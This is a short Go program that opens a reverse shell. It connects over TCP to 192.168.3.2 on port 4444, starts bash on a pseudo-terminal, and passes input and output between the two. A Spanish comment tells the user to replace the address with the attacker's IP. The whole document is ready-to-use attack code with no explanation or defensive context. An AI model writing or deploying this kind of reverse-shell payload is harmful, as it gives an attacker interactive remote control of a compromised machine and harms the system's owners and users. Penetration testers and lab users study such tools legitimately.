package main

import (
	"io"
	"net"
	"os/exec"

	"github.com/creack/pty"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.3.2:4444") // cambia TU_IP por la IP atacante
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/bash")
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return
	}
	defer ptmx.Close()

	go io.Copy(conn, ptmx)
	io.Copy(ptmx, conn)
}
